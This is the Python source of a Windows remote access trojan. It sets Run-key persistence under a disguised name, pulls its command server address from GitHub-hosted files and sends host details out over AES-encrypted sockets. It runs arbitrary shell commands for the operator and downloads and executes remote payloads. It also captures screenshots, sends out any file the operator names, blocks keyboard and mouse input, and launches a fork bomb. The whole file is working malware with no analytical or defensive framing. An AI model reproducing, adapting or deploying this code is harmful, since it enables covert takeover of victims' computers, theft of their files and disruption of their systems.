import socket
import os
import re
import sys
import pynput
import requests
import subprocess
import time
import threading
import public_ip as ip
import platform
import urllib.request
import pyautogui
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import hashlib
import winreg

WEBHOOK_URL = "&WEBHOOK_URL&"

print("started")

script_path = os.path.abspath(sys.argv[0])

try:
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "Sys Application Frame Host", 0, winreg.REG_SZ, script_path)
    winreg.CloseKey(reg_key)
    print("reg")
except Exception:
    pass


time.sleep(120)


BUFFER_SIZE = 4096



xprogrammer = "jesusflowerretard5ZOWBi9FcKCknltuFindthisdeseverLHArespect"


def generate_aes_key(xprogrammer):
    key = hashlib.sha256(xprogrammer.encode()).digest()
    aes_key = key[:16]
    return aes_key

def aes_encrypt(plaintext):
    key = generate_aes_key(xprogrammer)
    cipher = AES.new(key, AES.MODE_ECB)
    padded_plaintext = pad(plaintext.encode(), AES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    encrypted_text = base64.b64encode(ciphertext).decode()
    return encrypted_text

def aes_decrypt(encrypted_text):
    key = generate_aes_key(xprogrammer)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = base64.b64decode(encrypted_text)
    decrypted_plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_plaintext.decode()



def get_ip(url):
    amongus = urllib.request.urlopen(url)
    data = amongus.read().decode('utf-8')
    value = str(data.strip())  
    return value

def get_port(urlport):
    amongus = urllib.request.urlopen(urlport)
    data = amongus.read().decode('utf-8')
    value = str(data.strip())  
    int(value)
    return value
    


url = "https://raw.githubusercontent.com/hackerOrionX/test/main/sator"
urlport = "https://raw.githubusercontent.com/hackerOrionX/test/main/number"
HOST = '192.168.0.6'
PORT = 4444


def killinput():
    mouse_listener = pynput.mouse.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener = pynput.keyboard.Listener(suppress=True)
    keyboard_listener.start()

    time.sleep(120)
    
    mouse_listener.stop()
    keyboard_listener.stop()

def download():
    str(data)
    pattern = r"_url:(.+?)_name:(.+)"
    matches = re.search(pattern, data)
    if matches:
        url = matches.group(1)
        name = matches.group(2)
        response = requests.get(url)
        with open(name, "wb") as file:
                file.write(response.content)
                client_socket.send(aes_encrypt("[*] File successfully downloaded").encode())

    else:
        client_socket.send("[!] Invalid data send, can't download".encode())
        pass

def downloadexec():
        str(data)
        pattern = r"_url:(.+?)_name:(.+)"
        matches = re.search(pattern, data)
        if matches:
            url = matches.group(1)
            name = matches.group(2)
            response = requests.get(url)
            with open(name, "wb") as file:
                file.write(response.content)
                subprocess.Popen(name, shell=True)
                client_socket.send(aes_encrypt("[*] File successfully downloaded and exec").encode())

def screen():
    time.sleep(7)
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", 'rb') as f:
        file_size = os.path.getsize("screenshot.png")
        client_socket.send(str(file_size).encode())
        for datax in f:
            client_socket.sendall(datax)
    os.remove("screenshot.png")



def getinfos():
    global systeminfos
    hostname = socket.gethostname()
    ipx = ip.get()
    windowsversion = platform.platform()
    machine = platform.machine()
    systeminfos = f"|HOST: {hostname} {ipx}| |OS : {windowsversion} {machine}|"


script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
reverse = os.path.join(script_dir, 'Runtime.exe')
bomb = os.path.join(script_dir, 'bomb.bat')


while True:
    connected = False

    while not connected:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            HOST = get_ip(url)
            PORT = get_port(urlport)
            print("connect")
            client_socket.connect((HOST, PORT))
            getinfos() 
            connected = True
            
            client_socket.send(aes_encrypt(systeminfos).encode())


            while True:
                global data
                data = aes_decrypt(client_socket.recv(1024).decode())
                str(data)
                
                if data.strip() == "reverse":
                    subprocess.Popen(reverse, shell=True)
                elif data.strip() == "ping":
                    client_socket.send(aes_encrypt("pong").encode())
                elif data == "killinputs":
                    killinput()
                elif "#LHADOWNLOAD#" in data: 
                    download()
                elif "#LHADOWNLOADEXEC" in data:
                    downloadexec()
                elif data.strip() == "screen":
                    screen()
                elif data.strip() == "forkbomb":
                    subprocess.Popen(bomb, shell=True)
                elif "#LHAGETFILE#" in data:
                    time.sleep(7) 
                    filepath = data.replace("#LHAGETFILE#", "")

                    with open(f"{filepath}", 'rb') as f:
                        file_size = os.path.getsize(f"{filepath}")
                        client_socket.send(str(file_size).encode())

                        for data in f:
                            client_socket.sendall(data)
                else:
                    os.system(data)

        except (socket.error, OSError, ConnectionRefusedError, ConnectionAbortedError, ConnectionResetError, urllib.error.URLError, NameError):
            time.sleep(120)
            continue


        finally:
            client_socket.close()

    if connected:
        continue
